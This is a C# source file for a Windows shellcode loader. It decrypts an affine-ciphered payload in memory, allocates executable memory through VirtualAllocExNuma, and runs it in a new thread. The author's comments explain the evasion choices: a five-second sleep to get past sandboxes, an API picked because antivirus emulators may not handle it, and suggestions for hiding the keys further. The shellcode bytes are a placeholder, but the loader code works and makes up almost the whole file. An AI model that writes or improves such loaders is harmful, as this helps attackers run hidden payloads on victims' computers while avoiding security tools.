using System;
using System.Runtime.InteropServices;
using System.Threading;

// This was built in linux, I still have some TODO items, but the rest will have to be done in windows since I don't have access to the win32 APIs

// Build everything in-memory

// Once I make the program run entirely in-memory, I need to remove the Encrypt() function, and only supply the encrypted shellcode


class AffineCipher
{

    [DllImport("kernel32.dll", SetLastError = false)] // Disable setlasterror to false to reduce noise
    static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError = false, ExactSpelling = true)]
    static extern IntPtr VirtualAllocExNuma( // Can we find a BETTER non-emulated api here 
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect,
        uint nndPreferred
    );

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread( // Can we find a non-emulated api here as well? 
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        IntPtr lpThreadId
    );

    [DllImport("kernel32.dll")]
    static extern uint WaitForSingleObject( // Can we find a non-emulated api here as well? 
        IntPtr hHandle,
        uint dwMilliseconds
    );



    static void Main()
    {
        Thread.Sleep(5000); // Sleep to try to evade sandbox detection
        byte[] encrypted = new byte[] { 0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x41 }; // fake shellcode (put real shellcode here)

        // Affine keys ( Could base64 obfuscate, obfustace with math, etc... )
        int a_inv = 183;
        int b = 23;

        // Decrypting in memory
        var type = typeof(ObfuscationUtils);
        var method = type.GetMethod("Decrypt");
        byte[] buf = (byte[])method.Invoke(null, new object[] { encrypted, a_inv, b });
        int size = buf.Length;


        // Allocate memory using VirtualAllocExNuma
        IntPtr procHandle = GetCurrentProcess();
        IntPtr addr = VirtualAllocExNuma(procHandle, IntPtr.Zero, (uint)size, 0x3000, 0x40, 0);

        Marshal.Copy(buf, 0, addr, size);

        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}

public static class ObfuscationUtils
{
    public static byte[] Decrypt(byte[] input, int a_inv, int b)
    {
        byte[] result = new byte[input.Length];
        for (int i = 0; i < input.Length; i++)
        {
            int temp = a_inv * (input[i] - b);
            result[i] = (byte)((temp + 256 * 3) % 256);
        }
        return result;
    }
}